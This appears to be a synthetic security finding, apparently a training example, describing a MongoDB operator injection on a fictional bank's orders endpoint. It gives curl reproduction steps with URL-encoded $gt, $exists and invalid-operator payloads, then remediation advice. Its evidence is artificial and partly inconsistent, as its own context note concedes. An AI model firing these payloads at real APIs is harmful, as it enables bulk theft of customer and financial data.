## System

- System: NexaBank Open Finance API v4.6.0
- Domain: FINANCIAL SERVICES / RETAIL BANKING
- Example ID: INJ-0002
- Vulnerability: NoSQL Injection (MongoDB Operator Injection)
- Risk ID: RISK-INJ-002

## Context Note

Section 3.0 shows a SQL-style code snippet (`SELECT * FROM orders WHERE category = '${req.query.category}'`), but the platform is documented as MongoDB/document store (section 2.0), and the injection payload is a MongoDB operator (`{ "$gt": "" }`). The training signal is the MongoDB operator injection pattern — an attacker passes a JSON object as the `category` parameter value, which the server deserializes and uses directly in a MongoDB `find()` query without sanitization.

## Findings

### 1. NoSQL Operator Injection on `GET /api/v1/orders?category=` — MongoDB `$gt` Bypass (RISK-INJ-002)

Section 3.0 documents: endpoint `GET /api/v1/orders?category=<user_input>`. RISK-INJ-002: "Endpoint `/api/v1/orders` uses raw string concatenation. Parameterized queries are used in newer endpoints but this one was missed in the migration."

When the attacker passes `category={ "$gt": "" }`, the Node.js server deserializes this into a MongoDB operator object `{ category: { "$gt": "" } }`. MongoDB evaluates this as "return all orders where category is greater than an empty string" — which matches every document. The result is a full dump of the `orders` collection, including admin accounts and sensitive financial data.

**HAR evidence**: Request `GET /api/v1/orders?category={%20"$gt":%20""%20}` with `Authorization: Bearer` token. Response HTTP 200 with array including `{"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"}` and additional user records — full collection dump confirmed.

**Root Cause (section 2.0, RISK-INJ-002)**:
- Raw string/object concatenation without input type validation.
- User-supplied `category` value directly used in MongoDB query without checking it is a scalar string.
- Application connects as `db_owner` — excessive privilege (section 6.0).
- No WAF or input validation middleware on legacy endpoints (section 6.0).

**Financial impact**: the `orders` collection in a retail banking platform contains transaction records, account identifiers, and customer data. Returning all documents includes cross-tenant order data, constituting a GLBA privacy violation.

## Steps to Reproduce

**Step 1 — Normal baseline:**

```bash
curl -s "https://api.nexabank-open-f.example.com/api/v1/orders?category=WIRE_TRANSFER" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: returns only orders where `category == "WIRE_TRANSFER"`.

**Step 2 — MongoDB operator injection (primary HAR attack):**

```bash
curl -s "https://api.nexabank-open-f.example.com/api/v1/orders?category=%7B%22%24gt%22%3A%22%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Decoded: `category={"$gt":""}`. Expected vulnerable outcome: HTTP 200 with all documents in the `orders` collection, including admin password hashes and cross-tenant financial records. Expected secure outcome: HTTP 400 with generic error, or only matching literal `{"$gt":""}` string (no operator interpretation).

**Step 3 — Operator injection variants for enumeration:**

```bash
# Return all documents (where field exists)
curl -s "https://api.nexabank-open-f.example.com/api/v1/orders?category=%7B%22%24exists%22%3Atrue%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: all orders returned where `category` field is set.

**Step 4 — Verbose error confirmation (section 6.0):**

```bash
curl -s "https://api.nexabank-open-f.example.com/api/v1/orders?category=%7B%22%24invalidop%22%3A%22%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: MongoDB error message leaking collection name, field names, or operator support details.

## Secure Outcome

```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation

- **Validate that `category` is a scalar string** (RISK-INJ-002): reject any input that deserializes to an object or array — `if (typeof req.query.category !== 'string') return res.status(400).json({error: 'Invalid input'})`.
- **Use Mongoose schema validation**: define `category` as `String` type in the schema — Mongoose will reject operator objects.
- **Restrict DB account privileges** (section 6.0): replace `db_owner` with a least-privilege role with only `find` on required collections.
- **Disable verbose error messages in production** (section 6.0).
- **Deploy input validation middleware**: sanitize query parameters to block `$` prefixed keys.
